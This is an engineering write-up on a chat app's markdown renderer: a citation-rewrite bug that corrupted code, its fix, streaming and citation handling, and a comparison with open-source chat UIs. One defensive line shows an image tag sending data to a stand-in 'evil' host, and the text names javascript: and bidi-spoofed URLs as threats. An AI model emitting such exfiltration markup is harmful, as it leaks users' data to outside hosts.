# Rendering model output: what was broken, what changed, and how we compare

Written 2026-11-11. Companion notes in this folder were produced from the
source of each project, with the inspected commit pinned in each note:

| file | what it covers |
| --- | --- |
| `opencode-rendering.md` | `anomalyco/opencode` @ `e56eff2b` — `@opencode/patchmark`, marked, DOMPurify, KaTeX |
| `oss-chat-uis.md` | LibreChat, assistant-ui, LobeChat, Open WebUI, Chatbot UI |
| `provider-citation-formats.md` | every provider's citation payload, and how mature UIs normalise it |
| `markdown-edge-cases.md` | streaming, sanitisation, perf, Unicode, citation-parsing hazards |

---

## 1. The bug that started this

A Python snippet pasted out of the chat arrived as `grid[0](citation:0)`. The
model had not written that. The renderer did:

```tsx
content.replace(/\[(\d+)\]/g, '[$1](citation:$1)')   // before parsing
```

The rewrite ran on the raw markdown string, so it could not tell prose from
code. Every bracketed number in a fenced block became a citation link, and the
code block's copy button handed the corrupted text to the clipboard.

Two further problems were hiding behind it:

1. **The pills never actually rendered.** react-markdown runs every `href`
   through `defaultUrlTransform`, which allows `http(s)`, `irc(s)`, `mailto`,
   `xmpp` and blanks everything else. `citation:1` was blanked, so even a
   correctly rewritten marker produced a link with no destination.
2. **Nothing could tell a resolvable marker from an unresolvable one.** `[3]`
   in an answer with two sources made a pill that opened nothing.

### The fix, and why this shape

| change | file |
| --- | --- |
| Rewrite markers on the parsed tree (a remark plugin), prose `text` nodes only; code, inline code and link interiors are opaque | `src/lib/remarkCitations.ts` |
| `citationUrlTransform` — the default transform plus the `citation:` scheme | `src/lib/remarkCitations.ts` |
| Bound markers by `sources.length`; out-of-range stays literal text | `remarkCitations.ts` + `MarkdownMessage.tsx` |
| Regression test that fails against the old implementation | `src/components/chat/__tests__/MarkdownMessage.test.tsx` |

Parsing first is the whole point: `mdast` already knows which `code` node is a
fence and which `text` node is prose, so the plugin never re-derives that with
a regex. A raw-string pre-pass cannot, however careful it is.

---

## 2. What the renderer handles now

| behaviour | implementation | why |
| --- | --- | --- |
| `[1]`, `[1, 2]`, `[1;2]` | remark plugin on text nodes | OpenAI, Claude, Gemini, most open models |
| `【1】`, `【1†source】` | same plugin | Perplexity, CJK-trained models |
| `<cite …>…</cite>` | tag stripped from text **and** `html` nodes; inner sentence kept | Claude web-search wrapper; the parser turns it into an HTML node, not text |
| marker past the source list | left as literal text | a pill that opens nothing is worse than a bracket |
| provider-reported spans | `insertSourceMarkers` splices `[n](citation:n)` at the span end, before parsing; spans that touch a fence are dropped | OpenAI and Gemini cite by offset, so the answer contains no marker to find — and a splice by position cannot corrupt code |
| half-arrived `**bold`, `` `code ``, `[label](htt` | `healStreamingTail` closes them, **last block only**, with CommonMark's flanking rules | the text stops visibly jumping mid-stream; `snake_case`, `20~25°C` and `1 * 2 * 3` are left alone |
| bare fence (no language) | `remarkCodeFence` gives the mdast `code` node a `language-text` class | v10 removed the `inline` prop; without a class a **block** rendered as an inline chip, with no copy button |
| footnotes from two answers on one page | `rehypeUniqueIds` prefixes `user-content-fn-*` and `footnote-label` with a per-message `useId` | `remark-gfm` numbers per document; duplicate ids made the second answer's `[1]` jump to the first answer's note |
| ANSI escapes in code | `stripAnsi` on the rendered and copied text | tool output prints `[31m`, breaks the highlighter, and pastes into the reader's editor |
| math | `\(…\)` / `\[…\]` normalised to `$…$` / `$$…$$` outside code, then lazy `remark-math` + `rehype-katex` | models trained on LaTeX prose write the LaTeX form |
| math while streaming | disabled until the message settles | re-typesetting KaTeX per delta was the top cost in Open WebUI's profile |
| copy on a plain-HTTP origin | `copyText` falls back to `execCommand`, reports failure honestly | `navigator.clipboard` is absent outside a secure context |
| copying an answer | message copy takes the **markdown source**, through `copyText` | a table or fence pasted into an editor keeps its structure |
| RTL answers | `dir="auto"` per message | an Arabic or Hebrew answer must not depend on the page locale |
| footnote / in-page links | rendered as anchors, not as external links | they were promising a new tab that never opens |
| remote images | rendered as a link, not fetched | an `<img src="https://evil/?d=…">` leaks on render even when perfectly sanitised |
| unsafe source URLs | `isSafeExternalUrl`: http(s) only, and no bidi/zero-width characters | `javascript:` is one click away; U+202E makes a hostname *read* as a different domain |
| code blocks | `CodeView` — grammar by language tag, line numbers past 4 lines, `max-h-560px`, copy button | unknown languages render plain rather than guessing |

---

## 3. Comparison with the open-source chat UIs

"Stack" is the markdown engine. "Re-parse" is what happens to an answer while it
streams. `—` means the feature is absent in that project.

| | **ours** | **opencode** | **LibreChat** | **assistant-ui** | **LobeChat** | **Open WebUI** | **Chatbot UI** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| stack | react-markdown 10 + remark-gfm (+ math loaded lazily) | `@opencode/patchmark` for block structure + `marked` per block, in a worker | react-markdown **9** + 9 remark + 2 rehype plugins | react-markdown 10.1 | react-markdown 10.1 via `@lobehub/ui` | `marked` 9 lexer + Svelte per-token | react-markdown + remark-gfm |
| re-parse while streaming | whole message, deferred with `useDeferredValue`; plugin arrays memoised so a parent re-render does not re-parse | block-diff patches; only the tail is re-parsed; settled blocks reused by identity | incremental top-level block splitter, re-parses last 2 blocks | structural memo + `useSmooth`, opt-in defer | memoised per message | one `marked.lexer` pass per animation frame | full re-parse per token |
| partial inline constructs | `healStreamingTail` closes `**`, `*`, `` ` ``, `~~` and half-written links, **last block only**, with CommonMark flanking rules | `heal.ts` closes dangling `**`, `` ` ``, `~~`, `$$`; repairs half-written links | block splitter avoids re-parsing settled blocks | — | — | — | — |
| citation pills | ✅ inline pills + hover card, multi-format markers, plus provider spans spliced in | derived from **tool calls**, not prose markers | ✅ private-use Unicode protocol (U+E200–E204) → hover cards + pager | — | ✅ `[n]` → link | ✅ `[n]` → link | — |
| provider citation payloads normalised | ✅ backend (`llm/citations.py`) → spans → pills | — | — | — | — | — | — |
| footnote ids scoped per message | ✅ (`rehypeUniqueIds`) | — | — | — | — | — | — |
| code highlighting cost | `CodeView` per block, lazy grammar | incremental tokens, worker, 15s watchdog | per-block, 300 ms throttle | — | — | `hljs.highlight()` on every token | full re-tokenise on every token (`key={Math.random()}`) |
| line numbers | ✅ past 4 lines | — (only in the diff viewer) | — | — | — | — | — |
| math | lazy KaTeX, off while streaming | KaTeX (`$`, `$$`, `\(`, `\[`), in worker | remark-math + rehype-katex | `@assistant-ui/react-markdown` math | remark-math + rehype-katex | KaTeX after stream ends | remark-math, **no renderer** |
| Mermaid | — | ✅ (`pele/lazy`, last-good SVG while streaming) | — | — | ✅ | — | — |
| raw HTML from the model | dropped (no rehype-raw) | rendered then DOMPurify'd, fail-closed | rehype-raw + sanitize config | — | — | DOMPurify | rehype-raw |
| `dir="auto"` | ✅ on the message container | ✅ | ✅ | ✅ | ✅ | — | — |
| clipboard preserves markdown | markdown on the message copy button; plain text for mouse selections | ✅ semantic-HTML re-wrap | ✅ markdown/plain switch | ✅ | ✅ | plain | plain |
| worker / off-main-thread | — | ✅ | — | — | — | — | — |

### Where we are ahead

1. **Provider citations reach the UI at all.** No renderer in the five projects
   above parses OpenAI annotations, Gemini grounding or Anthropic citation
   blocks in the markdown layer. LibreChat and Open WebUI only understand the
   `[n]` marker the model already wrote. We now normalise the payload on the
   server (§5) and render the pills from it.
2. **The citation rewrite is structural.** Every one of them that post-processes
   `[n]` does it over text at some stage; ours is a remark plugin, so code is
   safe by construction rather than by regex discipline.
3. **ANSI stripping.** None of the five strip terminal escapes from tool output.
4. **Clipboard that reports the truth.** `navigator.clipboard` on an
   `http://` origin is absent, not broken; we fall back and say what happened.
5. **URL hardening includes bidi.** Only our source cards reject U+202E-style
   hostname spoofing.

### Where we are behind

1. **Incremental parsing.** opencode's `patchmark` and LibreChat's block
   splitter both avoid re-parsing a whole 20 000-character answer on every
   token. We re-parse all of it, deferred. `useDeferredValue` keeps the
   composer responsive but does not reduce the work. (Memoising the plugin
   arrays removed the *parent re-render* class of this — every message used to
   re-parse on any keystroke elsewhere — but not the per-delta cost of the one
   message actually streaming.)
2. **Nothing runs off the main thread.** opencode's markdown parse and
   highlight happen in a worker with a watchdog. We have no worker and no
   timeout, so a pathological message blocks paint.
3. **Mermaid.** Absent.
4. **Clipboard format.** The message-level copy button hands over the markdown
   source, so a copied table or fence keeps its structure. A *mouse* selection
   across a rendered table or code block is still plain text, losing what
   opencode and LobeChat preserve by re-wrapping the selection in its semantic
   ancestors.

---

## 4. Deliberate omissions

These are omissions with a reason, not oversights.

| omitted | reason |
| --- | --- |
| `rehype-raw` + `rehype-sanitize` | We never render model HTML, so there is nothing to sanitise. Adding raw HTML means owning a sanitiser schema; react-markdown's default (drop it) is the safer default. |
| Google favicons for sources | opencode builds them from the source hostname. That is a request to `google.com` per source, disclosing every cited URL. We render the hostname instead. |
| remote images | Existing exfiltration defence in `RemoteImage`; a sanitised `<img>` still fetches. |
| `remend`-style healing | Adopted, but *not* `remend`: `healStreamingTail` implements the GFM delimiter rules itself and only touches the last block. A false positive *changes the words the model wrote*, which is worse than a visible `**` for a few hundred milliseconds — so `snake_case`, `20~25°C` and `1 * 2 * 3` are tested as must-not-change. |
| debouncing the stream | Every mature implementation memoises or block-splits instead; a debounce just moves the same work later and makes the text stutter. |

---

## 5. Provider citations, end to end

Before this change the provider's own citations were dropped twice over:
`llm_base.py` forwarded a `citations` frame that no consumer read, and the
Responses parser had no branch for annotation events at all.

| provider | where it lives in the payload | handled by |
| --- | --- | --- |
| Perplexity / xAI / Groq Compound | top-level `citations: [url, …]` | `ChatChunkParser` → `normalize_citations` |
| OpenAI Chat Completions | `message.annotations[]`, `url_citation` nested or flat | same |
| OpenAI Responses | `response.output_text.annotation.added` → `annotation` | `ResponsesStreamParser.feed` |
| Gemini (native) | `candidates[].groundingMetadata.groundingChunks[].web{uri,title}` | `_grounding_metadata` in `ChatChunkParser` |
| Gemini (OpenAI-compatible proxies) | same, under `choices[]` | same helper |
| Anthropic web search | `content[].citations[]`, `type: *_location`, with `url`/`title`/`cited_text` | `normalize_citations` |
| Mistral | `content[]` parts with `reference_ids` | not yet — needs the id→source join |

`Backend/llm/citations.py` is deliberately envelope-agnostic: it walks for a URL
under `url`/`uri`/`href`/`link` or inside `web`/`retrievedContext`, keeps
`start_index`/`end_index` when present, and drops everything that is not a
usable `http(s)` URL. A provider we have never seen needs no new branch.

**Numbering.** `merge_sources` appends. That is the only order that leaves an
existing `[1]` pointing at the same source after the model's own citations
arrive — the first list is the one the prompt numbered. With no tool sources,
the provider's order *is* the order, which is exactly right for a Perplexity
answer whose prose says `[1]`.

**Threading.** `Completion.citations` → `agent_node` resolves each span against
the finished answer and merges into `meta["sources"]`, emitting `sources_update`
so the panel and the stored message both get it. Verified end-to-end in
`chat/tests/test_pipeline.py`.

**Spans → pills.** A provider that reports offsets writes no marker in the text,
so the pill has to be placed rather than found. `resolve_citation_spans` converts
offsets to character offsets into the *final* answer — Gemini's
`groundingSupports[].segment` counts UTF-8 **bytes**, so it is converted against
the text rather than sliced blindly, and validated before conversion (a clamped
value would otherwise look legitimate). `insertSourceMarkers` then splices
`[n](citation:n)` at each span end before the markdown is parsed. Nothing is
scanned, so code cannot be rewritten; the one way a span could still corrupt
text — pointing inside a fence because the provider cited a snippet — is dropped
explicitly.

---

## 6. Verification

| suite | result |
| --- | --- |
| frontend `npm test` | 61 files, **553 tests passed** |
| `npx eslint` on every changed/added frontend file | clean |
| `npx tsc -b` | clean |
| backend `llm/tests` + `test_pipeline` + `test_units` + `test_agent_tools` + `test_turn_output_e2e` | **351 passed**, 1 skipped |
| backend `test_iteration_limit`, `test_steering`, `test_tool_approval`, `test_chat`, `test_solution_citations` | 97 + 25 passed |

Two tests in this set are worth naming, because they are the ones that would
catch a regression of the original bug: the citation suite feeds the *old*
implementation the new cases and reproduces `dp[0](citation:0)` on all of them,
and `healStreamingTail` asserts that `snake_case`, `20~25°C` and `1 * 2 * 3` come
back unchanged.

---

## 7. Remaining gaps, ranked

Everything the earlier draft listed as a gap is now implemented — citation spans
threaded to pills, the streaming `heal` pass, per-message footnote scoping,
markdown on the message copy button. What is genuinely left:

1. **Incremental block parsing.** Porting the split from LibreChat's
   `markdownConfig.ts` (settled top-level blocks memoised by identity) is the
   single biggest perf win available; it also removes the need for
   `useDeferredValue` here. A 20 000-character answer still re-parses in full on
   every delta.
2. **Worker and timeout.** The parse and the highlight are on the main thread
   with no watchdog, so one pathological message blocks paint. opencode's
   answer to this is a worker plus a 15 s timeout.
3. **Mermaid**, if diagrams matter: lazy, render-on-settle, keep the last good
   SVG while streaming, fall back to the fenced source.
4. **Markdown on mouse selections.** The message copy button preserves
   structure; a selection across a rendered table or fence still copies plain
   text (opencode re-wraps the selection in its semantic ancestors).

---

## 8. Unrelated blocker found — fixed

`better-n8n-frontend/src/api/solutions.ts` declared `can_manage?: boolean`
twice in the same interface, so `tsc -b` failed with `TS2300: Duplicate
identifier` (and, after one of the two was removed out of caution, with
`TS2339: Property 'can_manage' does not exist` in three components). It is now a
single declaration with its doc comment, placed after `attention`. That file is
otherwise pre-existing WIP and was not touched further.

---

## 9. Performance note found while fixing

react-markdown v10 keys its parse `useEffect` on the **identity** of the
`remarkPlugins` and `rehypePlugins` arrays. We were passing fresh array
literals, so every message in the transcript re-parsed whenever *anything* in
the page re-rendered — including each keystroke in the composer. Both arrays are
now memoised in `MarkdownMessage.tsx`. This is the same trap LobeChat's
`memoised per message` row in §3 refers to, and it is not visible in the
component's own code: it only shows up by reading react-markdown's effect
dependencies.
